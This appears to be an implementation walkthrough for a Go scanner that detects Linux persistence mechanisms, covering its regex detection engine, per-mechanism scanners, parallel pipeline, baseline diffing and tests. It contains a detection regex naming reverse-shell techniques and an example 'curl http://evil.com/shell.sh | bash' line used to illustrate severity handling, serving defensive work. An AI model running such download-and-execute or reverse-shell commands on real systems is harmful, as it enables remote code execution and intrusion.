# Implementation Walkthrough

This document walks through the actual code. We'll cover the pattern engine, scanner module structure, the parallel execution pipeline, baseline diffing, and the ignore-list mechanism.

## File Structure Walkthrough

```
systemd-persistence-scanner/
├── cmd/sentinel/
│   └── main.go              # Entry point, blank import for scanner registration
├── pkg/types/
│   └── types.go             # Severity, Finding, ScanResult, Scanner interface
├── internal/
│   ├── cli/
│   │   ├── root.go          # Cobra root command, global flags
│   │   ├── scan.go          # Scan subcommand
│   │   └── baseline.go      # Baseline save/diff subcommands
│   ├── scanner/
│   │   ├── scanner.go       # Registry and RunAll()
│   │   ├── patterns.go      # 16 compiled regexes and MatchLine()
│   │   ├── helpers.go       # Shared filesystem utilities
│   │   ├── systemd.go       # Systemd unit scanner
│   │   ├── cron.go          # Cron job scanner
│   │   ├── profile.go       # Shell profile scanner
│   │   ├── ssh.go           # SSH config/keys scanner
│   │   ├── sshrc.go         # System-wide sshrc scanner
│   │   ├── preload.go       # LD_PRELOAD scanner
│   │   ├── kernel.go        # Kernel module scanner
│   │   ├── udev.go          # Udev rules scanner
│   │   ├── initd.go         # Init.d/rc.local scanner
│   │   ├── xdg.go           # XDG autostart scanner
│   │   ├── atjob.go         # At job scanner
│   │   ├── motd.go          # MOTD scripts scanner
│   │   ├── pam.go           # PAM config scanner
│   │   ├── logrotate.go     # Logrotate hooks scanner
│   │   ├── generator.go     # Systemd generator scanner
│   │   ├── completion.go    # Bash completion scanner
│   │   └── netifhook.go     # Network interface hooks scanner
│   ├── baseline/
│   │   └── baseline.go      # Snapshot save/load/diff
│   ├── config/
│   │   └── config.go        # Ignore-list parsing and filtering
│   ├── report/
│   │   ├── terminal.go      # Color-coded terminal output
│   │   └── json.go          # Structured JSON output
│   └── ui/
│       ├── banner.go        # ASCII SENTINEL banner
│       ├── color.go         # ANSI color functions (fatih/color wrappers)
│       └── spinner.go       # Braille frame spinner animation
└── testdata/                # Per-scanner fixture files
```

## The Pattern Engine

The pattern engine is the core detection mechanism. Every scanner delegates content analysis to it.

### Compiled Regex Patterns

All patterns are compiled once at package initialization. Each pattern targets a specific class of suspicious behavior:

```go
var ReverseShellPattern = regexp.MustCompile(
    `/dev/tcp/` +
        `|` +
        `\bmkfifo\b.*\bnc\b` +
        `|` +
        `\bsocat\b.*\bexec\b` +
        `|` +
        `python[23]?\s+-c\s+.*socket` +
        `|` +
        `perl\s+-e\s+.*socket` +
        `|` +
        `ruby\s+-rsocket`,
)
```

This single regex matches six different reverse shell implementations. The `\b` word boundary anchors prevent false positives on strings that happen to contain "nc" as a substring (like "once" or "function").

The `regexp.MustCompile` call panics if the regex is invalid. This is intentional: a broken pattern is a compile-time bug, not a runtime error. If the pattern compiles, it's guaranteed to work for the lifetime of the program.

### The SuspiciousPatterns Slice

Patterns are collected into an ordered slice with severity labels:

```go
var SuspiciousPatterns = []PatternMatch{
    {ReverseShellPattern, types.SeverityCritical, "reverse shell pattern"},
    {DownloadExecPattern, types.SeverityHigh, "download-and-execute chain"},
    {EncodingPattern, types.SeverityHigh, "encoded/obfuscated payload"},
    {NetworkToolPattern, types.SeverityMedium, "network tool invocation"},
    // ... 12 more patterns
}
```

The ordering doesn't affect matching (all patterns are checked), but it documents the severity hierarchy. Critical patterns like reverse shells and SUID manipulation appear first. Medium patterns like network tool invocations appear later.

### MatchLine: The Core API

Every scanner calls this function to analyze a line of text:

```go
func MatchLine(
    line string,
) (matched bool, sev types.Severity, label string) {
    best := types.SeverityInfo
    for _, p := range SuspiciousPatterns {
        if p.Pattern.MatchString(line) {
            if !matched || p.Severity > best {
                best = p.Severity
                label = p.Label
            }
            matched = true
        }
    }
    return matched, best, label
}
```

The key design decision: when a line matches multiple patterns, only the highest severity is returned. Consider this line:

```
curl http://evil.com/shell.sh | bash
```

This matches NetworkToolPattern (medium: "network tool invocation") and DownloadExecPattern (high: "download-and-execute chain"). MatchLine returns "high" with the label "download-and-execute chain" because that's the more specific and dangerous classification.

Without this deduplication, a single malicious line would generate multiple findings at different severities, creating noise and confusion in the report.

## Scanner Module Structure

Every scanner follows the same structure. Let's walk through the systemd scanner as the most complex example.

### Registration and Interface

```go
func init() {
    Register(&SystemdScanner{})
}

type SystemdScanner struct{}

func (s *SystemdScanner) Name() string {
    return systemdScannerName
}
```

The empty struct carries no state. Scanners are stateless: they receive a root path, read files, and return findings. No caching, no configuration, no side effects beyond filesystem reads.

### Directory Enumeration

```go
func (s *SystemdScanner) Scan(root string) []types.Finding {
    var findings []types.Finding

    for _, dir := range systemdDirs {
        resolved := ResolveRoot(root, dir)
        findings = append(findings, s.scanDir(resolved)...)
    }

    for _, home := range FindUserDirs(root) {
        userDir := filepath.Join(home, ".config", "systemd", "user")
        findings = append(findings, s.scanDir(userDir)...)
    }

    return findings
}
```

The scanner checks three system directories (/etc/systemd/system, /run/systemd/system, /usr/lib/systemd/system) plus per-user directories under ~/.config/systemd/user/. ResolveRoot() translates absolute paths relative to the scan root, enabling scanning of mounted filesystems or test fixtures.

### Unit File Analysis

The scanDir method filters files by extension (.service, .timer, .socket, .path) and maps each extension to its MITRE technique:

```go
mitre := mitreSystemd
switch ext {
case ".timer":
    mitre = mitreTimer
case ".path":
    mitre = mitrePath
}
```

Timers get T1053.006 (Systemd Timers), path units get T1543.002 (Systemd Service), and services/sockets get the default T1543.002. This granularity matters for ATT&CK coverage mapping.

The analyzeUnit method parses Exec directives:

```go
for _, line := range lines {
    trimmed := strings.TrimSpace(line)
    for _, directive := range execDirectives {
        if !strings.HasPrefix(trimmed, directive) {
            continue
        }
        cmd := strings.TrimPrefix(trimmed, directive)
        cmd = strings.TrimPrefix(cmd, "-")

        matched, sev, label := MatchLine(cmd)
        if matched {
            findings = append(findings, types.Finding{...})
        }
    }
}
```

The second TrimPrefix removes the "-" prefix that systemd uses to indicate "ignore exit code." The command content goes to MatchLine() for pattern analysis.

After content analysis, the scanner checks two filesystem properties:

```go
if IsWorldWritable(path) {
    findings = append(findings, types.Finding{
        Severity: types.SeverityMedium,
        Title:    "World-writable unit file",
    })
}

if ModifiedWithin(path, 24*time.Hour) {
    findings = append(findings, types.Finding{
        Severity: types.SeverityMedium,
        Title:    "Recently modified unit file",
    })
}
```

World-writable means any user can modify the file to inject malicious ExecStart commands. Recently modified (within 24 hours) is a heuristic: legitimate unit files change rarely, but a freshly planted backdoor was just written.

### Drop-in Override Scanning

Systemd supports drop-in directories (service-name.d/*.conf) that override the main unit file. Attackers can add an override that replaces ExecStart without touching the original file:

```go
entries := ListDir(dir)
for _, e := range entries {
    if e.IsDir() && strings.HasSuffix(e.Name(), ".d") {
        dropinDir := filepath.Join(dir, e.Name())
        for _, f := range ListFiles(dropinDir) {
            if strings.HasSuffix(f, ".conf") {
                findings = append(findings, s.analyzeUnit(f, mitreSystemd)...)
            }
        }
    }
}
```

This catches `sshd.service.d/override.conf` containing `ExecStartPost=/tmp/.backdoor`.

## Shared Filesystem Helpers

The helpers.go file provides safe file operations used by all scanners.

### Graceful Permission Handling

```go
func ReadLines(path string) []string {
    f, err := os.Open(path)
    if err != nil {
        return nil
    }
    defer f.Close()

    var lines []string
    sc := bufio.NewScanner(f)
    for sc.Scan() {
        lines = append(lines, sc.Text())
    }
    return lines
}
```

Returning nil instead of an error is intentional. Scanners enumerate many directories, most of which may not exist on a given system. The cron scanner checks /var/spool/cron/crontabs/ which doesn't exist on systems that never used crontab. Returning nil lets the caller's nil-check skip the file silently.

### ScanFileForPatterns Helper

Many scanners use the same loop: read lines, skip comments, call MatchLine, collect findings. This is extracted into a shared helper:

```go
func ScanFileForPatterns(
    path, scannerName, mitre string,
) []types.Finding {
    lines := ReadLines(path)
    var findings []types.Finding

    for _, line := range lines {
        if IsCommentOrEmpty(line) {
            continue
        }
        matched, sev, label := MatchLine(line)
        if matched {
            findings = append(findings, types.Finding{
                Scanner:  scannerName,
                Severity: sev,
                Title:    label,
                Path:     path,
                Evidence: strings.TrimSpace(line),
                MITRE:    mitre,
            })
        }
    }
    return findings
}
```

Scanners like profile.go, sshrc.go, and completion.go use this directly. Scanners with custom parsing (systemd, cron, udev) use MatchLine() directly because they need to extract commands from structured formats before matching.

## The Parallel Execution Pipeline

### How RunAll Works

```go
func RunAll(root string) []types.Finding {
    var (
        mu  sync.Mutex
        all []types.Finding
        g   errgroup.Group
    )

    for _, s := range registry {
        g.Go(func() error {
            results := s.Scan(root)
            mu.Lock()
            all = append(all, results...)
            mu.Unlock()
            return nil
        })
    }

    _ = g.Wait()
    return all
}
```

The loop variable `s` is captured by the closure correctly in Go 1.22+ (loop variable scoping change). Each goroutine gets its own copy of the scanner.

The mutex protects append to the shared slice. This is the simplest correct approach. An alternative would be channels, but a mutex with append is clearer and slightly faster for this use case (17 goroutines with small bursts of findings).

errgroup.Wait() blocks until all goroutines return. Since our goroutines always return nil, error handling is a no-op. We use errgroup instead of sync.WaitGroup because errgroup provides the same Wait() semantics with a cleaner API, and if we ever need to propagate scanner errors, the infrastructure is already in place.

## Baseline Diffing

### The Composite Key

The diff algorithm uses a composite string key to match findings across scans:

```go
func findingKey(f types.Finding) string {
    return f.Scanner + "|" + f.Path + "|" + f.Title
}
```

This key identifies a unique finding. If the same scanner reports the same title for the same file path, it's considered the same finding regardless of severity changes. The pipe delimiter prevents ambiguity (no field value legitimately contains "|").

Severity is excluded from the key intentionally. If a world-writable unit file gets its permissions fixed, the finding disappears entirely (good). If the finding's severity changes due to a pattern engine update, it doesn't show up as "new" (also good).

### The Diff Algorithm

```go
func Diff(baseline Snapshot, current []types.Finding) []types.Finding {
    known := make(map[string]bool, len(baseline.Findings))
    for _, f := range baseline.Findings {
        known[findingKey(f)] = true
    }

    var newFindings []types.Finding
    for _, f := range current {
        if !known[findingKey(f)] {
            newFindings = append(newFindings, f)
        }
    }
    return newFindings
}
```

Build a set of known finding keys from the baseline. For each current finding, check if its key exists in the set. If not, it's new. O(n+m) time, O(n) space where n is baseline size and m is current scan size.

## Ignore-List Filtering

### Parser Design

The ignore file uses a simplified YAML-like format:

```yaml
ignore:
  - path: /etc/cron.d/certbot
    scanner: cron
  - title: Kernel module loaded at boot
```

The parser is a hand-written line-by-line state machine. It tracks whether we're inside the `ignore:` block and accumulates fields into IgnoreRule structs:

```go
func parseIgnoreFile(data []byte) (IgnoreList, error) {
    var list IgnoreList
    var current IgnoreRule
    inIgnore := false

    for _, rawLine := range strings.Split(string(data), "\n") {
        line := strings.TrimSpace(rawLine)

        if line == "ignore:" {
            inIgnore = true
            continue
        }

        if strings.HasPrefix(line, "- ") {
            list.Rules = appendIfSet(list.Rules, current)
            current = IgnoreRule{}
            line = strings.TrimPrefix(line, "- ")
        }

        parseField(&current, strings.TrimSpace(line))
    }

    list.Rules = appendIfSet(list.Rules, current)
    return list, nil
}
```

A full YAML parser would be overkill for three fields. The hand-written parser has zero dependencies and handles the exact format the tool documents.

### Matching Logic

The filter applies AND logic within a rule and OR logic across rules:

```go
func (r IgnoreRule) matchesFinding(f types.Finding) bool {
    if r.Path != "" && f.Path != r.Path {
        return false
    }
    if r.Scanner != "" && f.Scanner != r.Scanner {
        return false
    }
    if r.Title != "" && f.Title != r.Title {
        return false
    }
    return true
}
```

Empty fields are wildcards. A rule with only `scanner: cron` suppresses all cron findings. A rule with `path: /etc/cron.d/certbot` and `scanner: cron` suppresses only cron findings for that specific file. This lets users write precise suppression rules without over-suppressing.

## Terminal Output

### Severity-Colored Output

The terminal renderer sorts findings by severity (critical first) and applies per-severity colors:

```go
var severityColor = map[types.Severity]func(a ...any) string{
    types.SeverityCritical: ui.HiRedBold,
    types.SeverityHigh:     ui.RedBold,
    types.SeverityMedium:   ui.YellowBold,
    types.SeverityLow:      ui.CyanBold,
    types.SeverityInfo:     ui.Dim,
}
```

Critical findings appear in bright bold red. Info findings appear dimmed. The visual hierarchy makes it possible to scan output and immediately spot the most dangerous findings.

### The Spinner

The spinner runs on its own goroutine while scanners work:

```go
func (s *Spinner) run() {
    defer s.wg.Done()
    fmt.Print("\033[?25l")  // hide cursor

    ticker := time.NewTicker(80 * time.Millisecond)
    defer ticker.Stop()

    idx := 0
    for {
        select {
        case <-s.done:
            clearLine()
            fmt.Print("\033[?25h")  // show cursor
            return
        case <-ticker.C:
            frame := frames[idx%len(frames)]
            fmt.Printf("\r  %s %s", CyanBold(frame), Magenta(s.msg))
            idx++
        }
    }
}
```

ANSI escape sequence `\033[?25l` hides the cursor to prevent flicker. The braille frames (`⠋ ⠙ ⠹ ⠸ ⠼ ⠴ ⠦ ⠧ ⠇ ⠏`) create a smooth rotation at 80ms per frame. The WaitGroup ensures Stop() blocks until the goroutine has cleaned up (cursor restored, line cleared).

## Testing Strategy

### Testdata Fixtures

Each scanner has test fixtures in the testdata/ directory. The fixtures are real-format files with known content:

```
testdata/
├── systemd/          # .service, .timer, .path files
├── cron/             # Crontab entries
├── ssh/              # sshd_config variants
├── sshrc/            # Clean and malicious sshrc
├── preload/          # ld.so.preload entries
├── kernel/           # modules-load.d and modprobe.d configs
├── udev/             # Udev rules with RUN+=
├── initd/            # Init scripts and rc.local
├── xdg/              # .desktop files
├── atjob/            # At job spool files
├── motd/             # MOTD scripts
├── pam/              # PAM configs
├── logrotate/        # Clean and malicious logrotate configs
├── generator/        # Generator executables
├── completion/       # Bash completion scripts
└── netifhook/        # Network interface hooks
```

Tests use t.TempDir() to create an isolated filesystem tree, copy fixture data in, and point the scanner at the temp root:

```go
func TestSystemdScanner_MaliciousService(t *testing.T) {
    root := t.TempDir()
    svcDir := filepath.Join(root, "etc", "systemd", "system")
    os.MkdirAll(svcDir, 0o750)

    src := filepath.Join(testdataDir(), "systemd", "backdoor.service")
    data, _ := os.ReadFile(src)
    writeTestFile(t, filepath.Join(svcDir, "backdoor.service"), string(data))

    s := &SystemdScanner{}
    findings := s.Scan(root)

    // Assert findings match expected detections
}
```

The scanner has no idea it's running against a temp directory. It calls ResolveRoot(root, "/etc/systemd/system") which returns the temp path. This is why every scanner takes a root parameter instead of hardcoding absolute paths.

### Running Tests

```bash
go test -race ./...
```

The `-race` flag enables the race detector, which is essential because scanners run concurrently. Any unsafe access to shared state during RunAll() will cause a test failure with a detailed goroutine trace.

## Dependencies

### Why Each Dependency

- **github.com/spf13/cobra v1.10.2**: CLI framework. Provides subcommands, persistent flags, help generation. The standard choice for Go CLI tools
- **github.com/fatih/color v1.19.0**: Terminal color output. Handles ANSI codes and Windows compatibility. The most widely used Go terminal color library
- **golang.org/x/sync v0.20.0**: Provides errgroup for structured goroutine coordination. Part of the Go extended standard library

Zero dependencies in the scanning logic. cobra and color are CLI/UI concerns. errgroup is concurrency infrastructure.

## Next Steps

You've seen how the code works. Now:

1. **Try the challenges** - [04-CHALLENGES.md](./04-CHALLENGES.md) has extension ideas from adding new scanners to YARA integration
2. **Run against testdata** - `sentinel scan --root testdata` exercises the pattern engine against known-malicious fixtures
3. **Add a scanner** - Pick a persistence mechanism not covered (Docker, containerd, cloud-init) and implement it following the existing pattern
